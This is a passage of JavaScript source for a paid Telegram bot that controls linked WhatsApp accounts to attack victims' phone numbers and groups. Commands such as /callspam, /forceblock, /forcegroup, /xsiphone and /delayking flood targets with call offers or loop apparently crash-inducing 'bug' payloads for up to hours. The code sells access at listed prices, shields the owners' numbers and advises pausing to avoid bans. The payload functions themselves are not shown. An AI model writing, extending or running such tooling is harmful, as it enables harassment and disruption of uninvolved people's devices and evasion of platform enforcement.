  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

    if (!match?.[1]?.trim()) {
    return userBot.sendMessage(chatId, 'Provide a phone number.\nExample: /reqpair +6281234567890');
  }

    const rawNumber = match[1].trim();
    if (!isValidPhoneNumber(rawNumber)) {
      return userBot.sendMessage(chatId, '❌ Invalid phone number. Use international format (e.g., +919876543210).');
    }

    const numberTarget = rawNumber.replace(/[^0-9+]/g, '').replace(/^\+/, '');

    try {
      const sessionDir = `./rent-session/${sanitizePath(numberTarget)}@s.whatsapp.net`;
      const chatIdForNumber = Object.keys(db.userNumbers).find((key) => db.userNumbers[key] === numberTarget);

      if (!chatIdForNumber || !sessions.has(numberTarget)) {
        return userBot.sendMessage(chatId, `❌ No active session found for ${numberTarget}.`);
      }

      const sock = sessions.get(numberTarget);
      if (sock) {
        await sock.logout();
      }

      await deleteFolderRecursive(sessionDir);
      delete db.userNumbers[chatIdForNumber];
      saveJson('./database/user_numbers.json', db.userNumbers);
      sessions.delete(numberTarget);
      whatsappStatusMap.delete(numberTarget);

    } catch (error) {
      console.error(`Error in /delpair for ${numberTarget}: ${error.message}`);
      await userBot.sendMessage(chatId, `❌ Failed to delete session for ${numberTarget}: ${error.message}`);
    }
  });
  
  // Register the /callspam command
botInstance.onText(/\/xxcallspam(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /callspam raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /callspam input: match[1] = "${match[1]}"`);

  if (!match[1] || match[1].trim() === '') {
    console.log(`[DEBUG] /callspam: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number.\nExample: /callspam +919876543210');
  }

  const rawTarget = match[1].trim();
  console.log(`[DEBUG] /callspam: rawTarget = "${rawTarget}"`);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /callspam: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /callspam: numberTarget = "${numberTarget}"`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /callspam: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  // Block specific numbers
  const blockedNumbers = ['916909137213', '919366316018', '919402104403'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ This number is blocked from being targeted.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  // Verify if the target number is registered on WhatsApp
  const userSock = sessions.get(userNumber);
  try {
    const contactInfo = await userSock.onWhatsApp(formattedNumber);
    if (contactInfo.length === 0) {
      return userBot.sendMessage(chatId, '❌ The number is not registered on WhatsApp.');
    }
  } catch (error) {
    console.error(`Error checking WhatsApp registration for ${numberTarget}: ${error.message}`);
    return userBot.sendMessage(chatId, `❌ Error verifying number: ${error.message}`);
  }

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│ Sent call spam...
│ Target: ${numberTarget}
│ From: ${userNumber}
└────────────────────────┘`,
    });

    await userBot.sendMessage(chatId, `✅ Successfully started call spam to @${numberTarget} using /callspam. Pause for 2 minutes to avoid bans.`, {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [[{ text: 'Contact Support', url: 'https://t.me/dgxeon13' }]],
      },
    });

    await sleep(1000);

    // Send 30 call offers with a 2-second delay between each
    for (let i = 0; i < 30; i++) {
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        return;
      }
      const success = await sendOfferCall(userSock, formattedNumber);
      if (!success) {
        await userBot.sendMessage(chatId, `❌ Failed to send call offer ${i + 1}/30 to ${numberTarget}.`);
        break;
      }
      await sleep(2000); // 2-second delay
    }
  } catch (error) {
    console.error(`Error in /callspam for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /callspam: ${error.message}`);
  }
});

botInstance.onText(/\/forcegroup(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /forcexgroup raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /forcexgroup input: match[1] = "${match[1]}"`);

  if (!match[1] || match[1].trim() === '') {
    console.log(`[DEBUG] /forcexgroup: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a group JID and optional loop count, separated by a pipe (|).\nExample: /forcegroup 120363047626537123@g.us|5\n\nTo get group ID, use /listgc or /group-id <link>');
  }

  const args = match[1].trim().split('|');
  const rawTarget = args[0].trim().replace(/\s/g, ''); // Remove any hidden whitespace
  let loopCount = parseInt(args[1]) || 5; // Default to 5 if not provided or invalid

  console.log(`[DEBUG] /forcexgroup: rawTarget = "${rawTarget}", length = ${rawTarget.split('@')[0].length}, loopCount = ${loopCount}`);

  // Check if input is a WhatsApp group link
  if (rawTarget.includes('chat.whatsapp.com')) {
    console.log(`[DEBUG] /forcexgroup: Input is a group link, sending error message`);
    return userBot.sendMessage(chatId, '❌ Group ID must be a JID (e.g., 120363047626537123@g.us). Use /group-id <link> to get the group ID.');
  }

  // Validate group JID format
  if (!/^\d{10,20}@g\.us$/.test(rawTarget)) {
    console.log(`[DEBUG] /forcexgroup: Invalid group JID format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid group JID. It must be a valid WhatsApp group ID (e.g., 120363047626537123@g.us).');
  }

  // Validate loop count
  if (isNaN(loopCount) || loopCount < 1) {
    loopCount = 5; // Default to 5 if invalid
    console.log(`[DEBUG] /forcexgroup: Invalid loop count, defaulting to ${loopCount}`);
  }

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent force messages to group...
│➻ Target: ${rawTarget.replace('@g.us', '')}
│➻ From: ${userNumber}
│➻ Loops: ${loopCount}
└────────────────────────┘`
    });

    await forcexgroup(rawTarget, userNumber, chatId, botInstance, loopCount);
  } catch (error) {
    console.error(`Error in /forcexgroup for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /forcexgroup: ${error.message}`);
  }
});

// Command handler for /forceblock
botInstance.onText(/\/forceblock(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /forceblock raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /forceblock input: match[1] = "${match[1]}"`);

  if (!match[1] || match[1].trim() === '') {
    console.log(`[DEBUG] /forceblock: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and optional loop count, separated by a pipe (|).\nExample: /forceblock +919876543210|5');
  }

  const args = match[1].trim().split('|');
  const rawTarget = args[0].trim().replace(/\s/g, ''); // Remove any hidden whitespace
  let loopCount = parseInt(args[1]) || 5; // Default to 5 if not provided or invalid

  console.log(`[DEBUG] /forceblock: rawTarget = "${rawTarget}", loopCount = ${loopCount}`);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /forceblock: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /forceblock: numberTarget = "${numberTarget}", loopCount = ${loopCount}`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /forceblock: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316008', '919402104403'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent forceblock...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Loops: ${loopCount}
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    await forceblock(formattedNumber, userNumber, chatId, botInstance, loopCount);
  } catch (error) {
    console.error(`Error in /forceblock for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /forceblock: ${error.message}`);
  }
});

// Register the /wui command
botInstance.onText(/\/wuixxd(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /wui raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /wui input: match[2] = "${match[2]}"`);

  let targetJid;
  if (msg.mentionedJid && msg.mentionedJid.length > 0) {
    targetJid = msg.mentionedJid[0]; // Use mentioned JID if available
    console.log(`[DEBUG] /wui: Using mentioned JID = "${targetJid}"`);
  } else if (msg.quoted && msg.quoted.sender) {
    targetJid = msg.quoted.sender; // Use quoted message sender if available
    console.log(`[DEBUG] /wui: Using quoted sender JID = "${targetJid}"`);
  } else if (match[2] && match[2].trim() !== '') {
    const rawTarget = match[2].trim();
    console.log(`[DEBUG] /wui: rawTarget = "${rawTarget}"`);

    if (!isValidPhoneNumber(rawTarget)) {
      console.log(`[DEBUG] /wui: Invalid phone number format for "${rawTarget}"`);
      return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
    }

    const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
    console.log(`[DEBUG] /wui: numberTarget = "${numberTarget}"`);

    if (numberTarget.length < 8 || numberTarget.length > 15) {
      console.log(`[DEBUG] /wui: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
      return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
    }

    targetJid = `${numberTarget}@s.whatsapp.net`;
  } else {
    console.log(`[DEBUG] /wui: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number, mention a user, or reply to a message.\nExample: /wui +919876543210');
  }

  if (!targetJid.endsWith('@s.whatsapp.net') || targetJid.includes('@g.us')) {
    console.log(`[DEBUG] /wui: Invalid JID format for "${targetJid}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target. Only individual WhatsApp numbers are supported.');
  }

  const numberTarget = targetJid.split('@')[0];
  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104403'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│ Sent bvg to 👇🏻
│ Target: ${numberTarget}
│ From: ${userNumber}
└────────────────────────┘`,
    });

    await wui(targetJid, userNumber, chatId, botInstance);
  } catch (error) {
    console.error(`Error in /wui for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /wui: ${error.message}`);
  }
});

// Telegram command handler

botInstance.onText(/\/fcbetaxxd(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /fcbeta raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /fcbeta input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /fcbeta: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number.\nExample: /xbetakill +919876543210');
  }

  const rawTarget = match[2].trim();
  console.log(`[DEBUG] /fcbeta: rawTarget = "${rawTarget}"`);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /fcbeta: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /fcbeta: numberTarget = "${numberTarget}"`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /fcbeta: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104403'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│ Sent bvg to 👇🏻
│ Target: ${numberTarget}
│ From: ${userNumber}
└────────────────────────┘`,
    });
        for (let i = 0; i < 2; i++) {
        await sleep(1000);
          await xeonBetaPayment(formattedNumber, userNumber, chatId, botInstance);
          await sleep(1000);
        }
  } catch (error) {
    console.error(`Error in /fcbeta for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /fcbeta: ${error.message}`);
  }
});

// Telegram command handler
botInstance.onText(/\/xxxxsiphonexxx(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /xsiphone raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /xsiphone input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /xsiphone: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number.\nExample: /xsiphone +919876543210');
  }

  const rawTarget = match[2].trim();
  console.log(`[DEBUG] /xsiphone: rawTarget = "${rawTarget}"`);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /xsiphone: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /xsiphone: numberTarget = "${numberTarget}"`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /xsiphone: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104403'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│ Sent bvg...
│ Target: ${numberTarget}
│ From: ${userNumber}
└────────────────────────┘`,
    });

for (let i = 0; i <300; i++) {
    await xsiphone(formattedNumber, userNumber, chatId, botInstance);
    await sleep(1000);
    }
  } catch (error) {
    console.error(`Error in /xsiphone for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /xsiphone: ${error.message}`);
  }
});

// Telegram command handler
botInstance.onText(/\/fbeowinfel(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /xdroidinvisible raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /xdroidinvisible input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /xeoninvisible: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number.\nExample: /xdroidinvisible +919876543210');
  }

  const rawTarget = match[2].trim();
  console.log(`[DEBUG] /xdroidinvisible: rawTarget = "${rawTarget}"`);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /xdroidinvisible: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /xdroidinvisible: numberTarget = "${numberTarget}"`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /xdroidinvisible: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104403'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│ Sent bvg...
│ Target: ${numberTarget}
│ From: ${userNumber}
└────────────────────────┘`,
    });

for (let i = 0; i <5; i++) {
    await xeonAndroidInvisible(formattedNumber, userNumber, chatId, botInstance);
    }
  } catch (error) {
    console.error(`Error in /xdroidinvisible for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /xeoninvisible: ${error.message}`);
  }
});

// Register the /xjammer command
botInstance.onText(/\/(xddff|defdeeffss)(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /delayking raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /delayking input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /delayking: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /delayking +919876543210 2\nExample: /stressking +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /delayking: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /delayking +919876543210 2\nExample: /stressking +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /delayking: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /delayking: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /delayking: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /delayking: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bug...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      XeonDelay1(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
    console.error(`Error in /delayking for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /delayking or /stressking: ${error.message}`);
  }
});

botInstance.onText(/\/newdelay(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /newdelay raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /newdelay input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /newdelay: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /newdelay +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /newdelay: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /newdelay +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

